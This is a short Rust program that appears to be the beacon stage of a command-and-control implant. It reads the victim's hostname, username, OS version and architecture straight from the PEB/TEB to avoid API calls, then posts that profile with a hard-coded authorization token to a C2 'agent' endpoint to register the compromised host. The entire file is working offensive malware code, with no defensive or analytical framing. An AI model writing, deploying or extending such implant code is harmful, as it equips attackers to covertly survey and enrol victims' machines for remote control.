use reqwest::blocking::Client;
use serde::Serialize;
use thermite::enumeration::*;

/// Represents the data sent to C2 when beaconing \
/// Contains all the necessary information to register a new host in the database
#[derive(Serialize)]
pub struct BeaconData {
	pub hostname: String,
	pub users: Vec<String>,
	pub os_family: String,
	pub os_version: String,
	pub arch: String,
}


fn main() -> Result<(), String> {
	let (maj, min, build) = unsafe { get_os_version() };
	let arch = get_environment_var("PROCESSOR_ARCHITECTURE").unwrap_or("Unknown".to_string());
	let os_family = get_environment_var("OS").unwrap_or("Unknown".to_string());
	// All this information is gathered by reading the PEB/TEB, no API calls needed
	let data = BeaconData {
		hostname: get_computer_name(),
		users: vec![get_username()],
		os_family,
		os_version: format!("{0}.{1} Build {2}", maj, min, build),
		arch,
	};

	let client = Client::new();
	let res =  client
		.post("http://localhost:3000/agent")
		.header("Authorization", "01912a94-2d2b-75f3-a024-149a9b56450b")
		.json(&data)
		.send().map_err(|e| e.to_string())?;
	println!("{:?}",res.text().map_err(|e| e.to_string())?);
	Ok(())

}


